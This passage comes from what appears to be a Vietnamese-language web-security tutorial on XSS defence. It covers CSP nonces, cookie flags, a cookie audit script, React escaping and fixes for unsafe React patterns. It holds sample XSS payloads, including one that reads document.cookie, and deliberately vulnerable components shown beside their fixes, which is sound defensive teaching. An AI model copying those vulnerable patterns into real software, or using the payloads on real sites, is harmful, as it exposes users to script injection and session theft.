  â”‚  CSP Vá»šI NONCE (tá»‘t nháº¥t):                            â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Header: script-src 'nonce-abc123'               â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  <script nonce="abc123">                         â”‚  â”‚
  â”‚  â”‚    // Code chÃ­nh chá»§ â†’ nonce ÄÃšNG â†’ CHáº Y! âœ…   â”‚  â”‚
  â”‚  â”‚  </script>                                       â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  <script>alert('XSS')</script>                   â”‚  â”‚
  â”‚  â”‚  â†’ KHÃ”NG CÃ“ nonce â†’ CHáº¶N! âœ…                   â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  <script nonce="wrong">alert('XSS')</script>     â”‚  â”‚
  â”‚  â”‚  â†’ nonce SAI â†’ CHáº¶N! âœ…                         â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âš  Nonce PHáº¢I random má»—i request!               â”‚  â”‚
  â”‚  â”‚  â†’ Hacker KHÃ”NG ÄOÃN Ä‘Æ°á»£c nonce!                â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§10. HttpOnly & Secure Cookies â€” Báº£o Vá»‡ Cookie!

### 10.1. Cookie Flags Quan Trá»ng!

```
  COOKIE FLAGS â€” PHÃ’NG THá»¦ COOKIE THEFT:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  â‘  HttpOnly FLAG:                                      â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Set-Cookie: session_id=abc123; HttpOnly         â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  HttpOnly = JavaScript KHÃ”NG Äá»ŒC ÄÆ¯á»¢C!          â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  KHÃ”NG CÃ“ HttpOnly:                              â”‚  â”‚
  â”‚  â”‚  document.cookie â†’ "session_id=abc123"          â”‚  â”‚
  â”‚  â”‚  â†’ XSS Äá»ŒC ÄÆ¯á»¢C! âŒ                            â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  CÃ“ HttpOnly:                                    â”‚  â”‚
  â”‚  â”‚  document.cookie â†’ "" (TRá»NG!)                  â”‚  â”‚
  â”‚  â”‚  â†’ XSS KHÃ”NG Äá»ŒC ÄÆ¯á»¢C! âœ…                      â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  âš  Browser VáºªN Gá»¬I cookie trong request!        â”‚  â”‚
  â”‚  â”‚  â†’ Server váº«n nháº­n session_id!                  â”‚  â”‚
  â”‚  â”‚  â†’ Chá»‰ JavaScript khÃ´ng Ä‘á»c Ä‘Æ°á»£c!               â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘¡ Secure FLAG:                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Set-Cookie: session_id=abc123; Secure           â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  Secure = CHá»ˆ gá»­i qua HTTPS!                    â”‚  â”‚
  â”‚  â”‚  â†’ HTTP request â†’ KHÃ”NG gá»­i cookie!             â”‚  â”‚
  â”‚  â”‚  â†’ Chá»‘ng nghe lÃ©n trÃªn máº¡ng!                    â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘¢ SameSite FLAG:                                      â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Set-Cookie: session_id=abc123; SameSite=Strict  â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  SameSite=Strict:                                â”‚  â”‚
  â”‚  â”‚  â†’ Cookie CHá»ˆ gá»­i khi request tá»« CÃ™NG site!    â”‚  â”‚
  â”‚  â”‚  â†’ Link tá»« email click â†’ KHÃ”NG gá»­i cookie!     â”‚  â”‚
  â”‚  â”‚  â†’ Chá»‘ng CSRF!                                  â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  SameSite=Lax (default):                         â”‚  â”‚
  â”‚  â”‚  â†’ Gá»­i cookie khi top-level navigation!         â”‚  â”‚
  â”‚  â”‚  â†’ KHÃ”NG gá»­i cho sub-request (img, iframe)!    â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  SameSite=None:                                  â”‚  â”‚
  â”‚  â”‚  â†’ Gá»­i LUÃ”N (ká»ƒ cáº£ cross-site!)                â”‚  â”‚
  â”‚  â”‚  â†’ PHáº¢I kÃ¨m Secure flag!                        â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  â‘£ COOKIE Tá»I Æ¯U Báº¢O Máº¬T:                             â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  Set-Cookie: session_id=abc123;                  â”‚  â”‚
  â”‚  â”‚    HttpOnly;                                     â”‚  â”‚
  â”‚  â”‚    Secure;                                       â”‚  â”‚
  â”‚  â”‚    SameSite=Strict;                              â”‚  â”‚
  â”‚  â”‚    Path=/;                                       â”‚  â”‚
  â”‚  â”‚    Max-Age=3600                                  â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ HttpOnly: JS khÃ´ng Ä‘á»c Ä‘Æ°á»£c!                 â”‚  â”‚
  â”‚  â”‚  â†’ Secure: Chá»‰ qua HTTPS!                      â”‚  â”‚
  â”‚  â”‚  â†’ SameSite: Chá»‘ng CSRF!                        â”‚  â”‚
  â”‚  â”‚  â†’ Path=/: ToÃ n bá»™ site!                        â”‚  â”‚
  â”‚  â”‚  â†’ Max-Age: Háº¿t háº¡n sau 1 giá»!                 â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 10.2. Tá»± Viáº¿t â€” Cookie Parser & Validator!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// COOKIE PARSER & VALIDATOR â€” Tá»° VIáº¾T!
// Kiá»ƒm tra cookie cÃ³ an toÃ n khÃ´ng!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  PARSE Set-Cookie header:
function parseSetCookie(header) {
  var parts = header.split(";");
  var cookie = {};

  // Pháº§n Ä‘áº§u: name=value
  var firstPart = parts[0].trim();
  var eqIndex = firstPart.indexOf("=");
  cookie.name = firstPart.substring(0, eqIndex).trim();
  cookie.value = firstPart.substring(eqIndex + 1).trim();

  // Pháº§n cÃ²n láº¡i: flags
  cookie.httpOnly = false;
  cookie.secure = false;
  cookie.sameSite = "lax"; // Default
  cookie.path = "/";
  cookie.maxAge = null;
  cookie.domain = null;

  for (var i = 1; i < parts.length; i++) {
    var part = parts[i].trim().toLowerCase();

    if (part === "httponly") {
      cookie.httpOnly = true;
    } else if (part === "secure") {
      cookie.secure = true;
    } else if (part.indexOf("samesite=") === 0) {
      cookie.sameSite = part.split("=")[1].trim();
    } else if (part.indexOf("path=") === 0) {
      cookie.path = parts[i].trim().split("=")[1].trim();
    } else if (part.indexOf("max-age=") === 0) {
      cookie.maxAge = parseInt(part.split("=")[1].trim(), 10);
    } else if (part.indexOf("domain=") === 0) {
      cookie.domain = parts[i].trim().split("=")[1].trim();
    }
  }

  return cookie;
}

// â‘¡ KIá»‚M TRA Báº¢O Máº¬T:
function auditCookie(cookie) {
  var issues = [];
  var score = 100; // Äiá»ƒm báº£o máº­t tá»‘i Ä‘a

  // Kiá»ƒm tra HttpOnly:
  if (!cookie.httpOnly) {
    issues.push("âŒ THIáº¾U HttpOnly! JavaScript cÃ³ thá»ƒ Ä‘á»c cookie!");
    score -= 30;
  }

  // Kiá»ƒm tra Secure:
  if (!cookie.secure) {
    issues.push("âŒ THIáº¾U Secure! Cookie gá»­i qua HTTP khÃ´ng mÃ£ hÃ³a!");
    score -= 25;
  }

  // Kiá»ƒm tra SameSite:
  if (cookie.sameSite === "none") {
    issues.push("âš  SameSite=None! Cookie gá»­i cross-site (CSRF risk)!");
    score -= 20;
  } else if (cookie.sameSite === "lax") {
    issues.push("âš  SameSite=Lax â€” OK nhÆ°ng Strict an toÃ n hÆ¡n!");
    score -= 5;
  }

  // Kiá»ƒm tra Max-Age:
  if (cookie.maxAge === null) {
    issues.push("âš  KHÃ”NG CÃ“ Max-Age! Cookie tá»“n táº¡i Ä‘áº¿n khi Ä‘Ã³ng tab!");
    score -= 10;
  } else if (cookie.maxAge > 86400) {
    issues.push("âš  Max-Age > 24h! Cookie tá»“n táº¡i quÃ¡ lÃ¢u!");
    score -= 10;
  }

  // Kiá»ƒm tra tÃªn cookie:
  if (cookie.name.indexOf("session") !== -1 && !cookie.httpOnly) {
    issues.push("ğŸš¨ Session cookie KHÃ”NG cÃ³ HttpOnly! Cá»°C Ká»² NGUY HIá»‚M!");
    score -= 20;
  }

  return {
    cookie: cookie,
    score: Math.max(0, score),
    issues: issues,
    rating:
      score >= 90
        ? "A (Xuáº¥t sáº¯c!)"
        : score >= 70
          ? "B (Tá»‘t)"
          : score >= 50
            ? "C (Trung bÃ¬nh)"
            : "F (NGUY HIá»‚M!)",
  };
}

// â‘¢ THá»¬ NGHIá»†M:
var cookies = [
  // Cookie KHÃ”NG an toÃ n:
  "session_id=abc123; Path=/",
  // Cookie tá»‘t:
  "session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600",
  // Cookie trung bÃ¬nh:
  "user_pref=dark; Secure; SameSite=Lax; Max-Age=2592000",
];

for (var i = 0; i < cookies.length; i++) {
  var parsed = parseSetCookie(cookies[i]);
  var audit = auditCookie(parsed);

  console.log("Cookie:", parsed.name);
  console.log("Score:", audit.score + "/100 â€” " + audit.rating);
  for (var j = 0; j < audit.issues.length; j++) {
    console.log("  " + audit.issues[j]);
  }
  console.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");
}
```

---

## Â§11. React & XSS â€” Framework Báº£o Vá»‡ NhÆ° Tháº¿ NÃ o?

### 11.1. React Auto-Escaping!

```
  REACT XSS PROTECTION â€” Tá»° Äá»˜NG ESCAPE:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  REACT Máº¶C Äá»ŠNH AN TOÃ€N!                               â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  JSX tá»± Ä‘á»™ng ESCAPE táº¥t cáº£ giÃ¡ trá»‹!             â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  const name = '<script>alert("XSS")</script>';  â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  // React JSX:                                   â”‚  â”‚
  â”‚  â”‚  <h1>Hello, {name}</h1>                          â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  // React RENDER:                                â”‚  â”‚
  â”‚  â”‚  <h1>Hello, &lt;script&gt;alert("XSS")          â”‚  â”‚
  â”‚  â”‚    &lt;/script&gt;</h1>                           â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ Script KHÃ”NG CHáº Y!                           â”‚  â”‚
  â”‚  â”‚  â†’ Hiá»ƒn thá»‹ nhÆ° TEXT!                            â”‚  â”‚
  â”‚  â”‚  â†’ React Tá»° Äá»˜NG escape cho báº¡n!                â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â”‚  REACT LÃ€M GÃŒ BÃŠN TRONG?                              â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  // React source code (simplified):              â”‚  â”‚
  â”‚  â”‚  function escapeHtml(text) {                     â”‚  â”‚
  â”‚  â”‚    return text                                   â”‚  â”‚
  â”‚  â”‚      .replace(/&/g, '&amp;')                    â”‚  â”‚
  â”‚  â”‚      .replace(/</g, '&lt;')                     â”‚  â”‚
  â”‚  â”‚      .replace(/>/g, '&gt;')                     â”‚  â”‚
  â”‚  â”‚      .replace(/"/g, '&quot;')                   â”‚  â”‚
  â”‚  â”‚      .replace(/'/g, '&#x27;');                  â”‚  â”‚
  â”‚  â”‚  }                                               â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â”‚  â†’ GIá»NG escapeHTML() mÃ  ta viáº¿t á»Ÿ Â§7!          â”‚  â”‚
  â”‚  â”‚  â†’ React dÃ¹ng cÃ¹ng nguyÃªn lÃ½!                   â”‚  â”‚
  â”‚  â”‚                                                  â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 11.2. dangerouslySetInnerHTML â€” Lá»— Há»•ng Trong React!

```javascript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REACT XSS VULNERABILITIES â€” CÃCH Bá»Š XSS TRONG REACT!
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// â‘  dangerouslySetInnerHTML â€” NGUY HIá»‚M NHáº¤T!
function VulnerableComponent({ userContent }) {
  // âŒ NGUY HIá»‚M! ChÃ¨n HTML thÃ´!
  return <div dangerouslySetInnerHTML={{ __html: userContent }} />;

  // Náº¿u userContent = '<script>alert("XSS")</script>'
  // â†’ React KHÃ”NG escape!
  // â†’ HTML CHÃˆN TRá»°C TIáº¾P!

  // âš  TÃŠN "dangerouslySetInnerHTML" lÃ  Cá» Ã!
  // â†’ React Cáº¢NH BÃO báº¡n: "ÄÃ‚Y LÃ€ NGUY HIá»‚M!"
  // â†’ PHáº¢I sanitize TRÆ¯á»šC khi dÃ¹ng!
}

// âœ… FIX â€” Sanitize trÆ°á»›c khi dÃ¹ng:
function SafeComponent({ userContent }) {
  // DÃ¹ng sanitizer (nhÆ° HTMLSanitizer á»Ÿ Â§8!):
  var cleanHTML = HTMLSanitizer.sanitize(userContent);

  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// â‘¡ href="javascript:" â€” XSS QUA URL!
function VulnerableLink({ userUrl }) {
  // âŒ NGUY HIá»‚M! User cÃ³ thá»ƒ chÃ¨n javascript:!
  return <a href={userUrl}>Click me</a>;

  // Náº¿u userUrl = "javascript:alert(document.cookie)"
  // â†’ Click â†’ CHáº Y JavaScript!
  // â†’ React KHÃ”NG cháº·n javascript: protocol!
}

// âœ… FIX â€” Validate URL:
function SafeLink({ userUrl }) {
  // Kiá»ƒm tra protocol:
  var safeUrl = "#";
  if (userUrl) {
    var lower = userUrl.toLowerCase().trim();
    if (
      lower.indexOf("http://") === 0 ||
      lower.indexOf("https://") === 0 ||
      lower.indexOf("/") === 0
    ) {
      safeUrl = userUrl;
    }
  }

  return <a href={safeUrl}>Click me</a>;
}

// â‘¢ React Component Injection:
function VulnerableRenderer({ componentName, props }) {
  // âŒ NGUY HIá»‚M náº¿u componentName tá»« user!
  var Component = components[componentName];
  return <Component {...props} />;

  // User cÃ³ thá»ƒ inject component khÃ´ng mong muá»‘n!
}

// â‘£ Server-Side Rendering (SSR) XSS:
// Khi dÃ¹ng SSR, dá»¯ liá»‡u serialize vÃ o HTML:
function VulnerableSSR() {
  // âŒ ChÃ¨n data vÃ o <script> tag:
  var html =
    "<script>window.__DATA__ = " + JSON.stringify(userData) + "</script>";
  // Náº¿u userData chá»©a </script> â†’ THOÃT!
  // â†’ XSS trong SSR!
}

// âœ… FIX SSR:
function SafeSSR() {
  // Escape </script> trong JSON:
  var safeData = JSON.stringify(userData)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e");

  var html = "<script>window.__DATA__ = " + safeData + "</script>";
}
```

```
  REACT XSS PROTECTION â€” SÆ  Äá»’:
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚
  â”‚  â”‚ REACT JSX â€” Máº¶C Äá»ŠNH AN TOÃ€N:             â”‚        â”‚
  â”‚  â”‚                                            â”‚        â”‚
  â”‚  â”‚  {variable} â†’ AUTO ESCAPE! âœ…             â”‚        â”‚
  â”‚  â”‚  <p>{userInput}</p> â†’ AN TOÃ€N!            â”‚        â”‚
  â”‚  â”‚  <img src={userUrl} /> â†’ PHáº¦N Lá»šN OK!    â”‚        â”‚
  â”‚  â”‚  style={{color: value}} â†’ AN TOÃ€N!        â”‚        â”‚
  â”‚  â”‚                                            â”‚        â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚
  â”‚                                                        â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”        â”‚
  â”‚  â”‚ REACT â€” CÃC Lá»– Há»”NG CÃ’N Láº I:            â”‚        â”‚
  â”‚  â”‚                                            â”‚        â”‚
  â”‚  â”‚  dangerouslySetInnerHTML â† XSS! âŒ        â”‚        â”‚
  â”‚  â”‚  href="javascript:..." â† XSS! âŒ         â”‚        â”‚
  â”‚  â”‚  eval(userInput)        â† XSS! âŒ         â”‚        â”‚
  â”‚  â”‚  SSR serialization      â† XSS risk! âš     â”‚        â”‚
  â”‚  â”‚  ref + DOM manipulation â† XSS risk! âš     â”‚        â”‚
  â”‚  â”‚                                            â”‚        â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        â”‚
  â”‚                                                        â”‚
  â”‚  NGUYÃŠN Táº®C TRONG REACT:                               â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
  â”‚  â”‚  â‘  LUÃ”N dÃ¹ng JSX interpolation {variable}!     â”‚  â”‚
  â”‚  â”‚  â‘¡ TRÃNH dangerouslySetInnerHTML!               â”‚  â”‚
  â”‚  â”‚  â‘¢ Náº¿u PHáº¢I dÃ¹ng â†’ SANITIZE trÆ°á»›c!             â”‚  â”‚
  â”‚  â”‚  â‘£ VALIDATE táº¥t cáº£ URL trÆ°á»›c khi dÃ¹ng href!    â”‚  â”‚
  â”‚  â”‚  â‘¤ KHÃ”NG BAO GIá»œ dÃ¹ng eval() vá»›i user input!   â”‚  â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
  â”‚                                                        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Â§12. Tá»•ng Káº¿t â€” XSS Defense Checklist & Interview Q&A!

### 12.1. SÆ¡ Äá»“ Tá»•ng Há»£p!

```
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚              XSS â€” Tá»”NG Káº¾T TOÃ€N Bá»˜!                 â”‚
  â”‚                                                        â”‚
  â”‚  3 LOáº I Táº¤N CÃ”NG:         3 Lá»šP PHÃ’NG THá»¦:           â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚
  â”‚  â”‚ Stored XSS  â”‚ â† â”€â”€â”€â”€ â”‚ â‘  ESCAPE OUTPUT  â”‚         â”‚
  â”‚  â”‚ (Database)  â”‚         â”‚ escapeHTML()      â”‚         â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚ escapeAttribute() â”‚         â”‚
  â”‚                           â”‚ escapeJS()        â”‚         â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚
  â”‚  â”‚ Reflected   â”‚ â† â”€â”€â”€â”€ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚
  â”‚  â”‚ XSS (URL)   â”‚         â”‚ â‘¡ SANITIZE HTML  â”‚         â”‚
  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚ HTMLSanitizer()   â”‚         â”‚
  â”‚                           â”‚ (whitelist tags)  â”‚         â”‚
  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â”‚
  â”‚  â”‚ DOM-based   â”‚ â† â”€â”€â”€â”€ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”         â”‚
